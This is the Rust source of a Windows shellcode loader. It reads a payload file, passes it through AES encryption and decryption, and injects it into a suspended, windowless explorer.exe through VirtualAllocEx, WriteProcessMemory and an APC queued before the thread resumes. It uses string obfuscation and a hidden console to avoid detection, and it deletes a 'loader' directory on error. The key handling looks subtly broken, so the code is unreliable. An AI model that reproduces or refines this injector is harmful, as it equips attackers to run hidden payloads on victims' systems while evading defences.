#![windows_subsystem = "windows"]

use std::env;
use std::fs::{read, remove_dir_all};
use libaes::Cipher;
use std::ptr::{null, null_mut};
use windows::Win32::Foundation::{BOOL, CloseHandle, GetLastError};
use windows::Win32::System::Diagnostics::Debug::WriteProcessMemory;
use windows::Win32::System::Memory::{VirtualAllocEx, MEM_RESERVE, MEM_COMMIT, PAGE_EXECUTE_READWRITE};
use windows::Win32::System::Threading::{CreateProcessW,CREATE_SUSPENDED,CREATE_NO_WINDOW, STARTUPINFOW, PROCESS_INFORMATION, QueueUserAPC, ResumeThread};
use windows::Win32::Security::SECURITY_ATTRIBUTES;
use std::mem::{zeroed, size_of};
use windows::core::{PCWSTR, PWSTR};
use obfstr::obfstr;
use rand::prelude::*;

fn main() {
    let args: Vec<String> = env::args().collect();

    let file_path = &args[1];
    println!("Reading from  file {}", file_path);
    let myshe = read_file(String::from(file_path));
    let (myshe_code,pass_word1,pass_word2) = aes_base64(myshe);

    let pass_word1: &[u8; 16] = <&[u8; 16]>::try_from(pass_word1.as_bytes()).unwrap();
    let pass_word2: &[u8; 16] = <&[u8; 16]>::try_from(pass_word2.as_bytes()).unwrap();

    let cipher = Cipher::new_128(&pass_word1);
    let myshecode = base64_decode(String::from(myshe_code));
    let myshecode = cipher.cbc_decrypt(pass_word2, &myshecode[..]);
    let path:Vec<u16> = obfstr!("C:\\Windows\\explorer.exe\0").encode_utf16().collect();
    unsafe{
        let temp = zeroed::<SECURITY_ATTRIBUTES>();
        let mut  info = zeroed::<STARTUPINFOW>();
        info.cb = size_of::<STARTUPINFOW>() as _;
        let mut info2 = zeroed::<PROCESS_INFORMATION>();
        if CreateProcessW(PCWSTR(path.as_ptr() as _),PWSTR(std::ptr::null_mut()),&temp,&temp,BOOL(1),CREATE_NO_WINDOW|CREATE_SUSPENDED,null(),PCWSTR(null()),&info as _,&mut info2).as_bool(){
            let addr = VirtualAllocEx(info2.hProcess, null(), myshecode.len(), MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);

            WriteProcessMemory(info2.hProcess, addr, myshecode.as_ptr() as _, myshecode.len(), null_mut());

            QueueUserAPC(Some(std::mem::transmute(addr)),info2.hThread,0);
 
            ResumeThread(info2.hThread);

            CloseHandle(info2.hThread);
        }else{
            println!("failed : {:?}",GetLastError());
        }
    }

}

fn base64_decode(myshecode:String)->Vec<u8>{
    base64::decode_config(myshecode,base64::STANDARD_NO_PAD).unwrap()
}

pub fn aes_base64(myshecode:Vec<u8>)->(String,String,String){
    //定义常量
    pub const AES_PASSWORD_LEN: usize = 32;
    pub const RANDOM_AES_KEY: &[u8] = b"abcdefghijklmnopqrstuvwxyz";

    let mut rng = rand::thread_rng();
    let password1: String = (0..AES_PASSWORD_LEN)
        .map(|_| {
            let idx = rng.gen_range(0..RANDOM_AES_KEY.len());
            char::from(unsafe { *RANDOM_AES_KEY.get_unchecked(idx) })
        }).collect();

    println!("aes key is {}",&password1);
    let password2: String = (0..AES_PASSWORD_LEN)
        .map(|_| {
            let idx = rng.gen_range(0..RANDOM_AES_KEY.len());
            char::from(unsafe { *RANDOM_AES_KEY.get_unchecked(idx) })
        }).collect();
    println!("iv key is {}",&password2);
    let cipher = Cipher::new_128(password1.as_bytes()[0..16].try_into().unwrap());
    let myshecode = cipher.cbc_encrypt(password2.as_bytes(), &myshecode);

    let myshecode = base64_encode(myshecode);

    (myshecode,password1,password2)

}

pub fn base64_encode(shellcode: Vec<u8>) -> String {
    base64::encode_config(shellcode, base64::STANDARD_NO_PAD)
}

pub fn read_file(filename: String) -> Vec<u8> {
    let shellcode = match read(filename) {
        Ok(res) => res,
        Err(err) => {
            println!("{}", err);
            let _ = remove_dir_all("loader");
            std::process::exit(1);
        }
    };
    shellcode
}
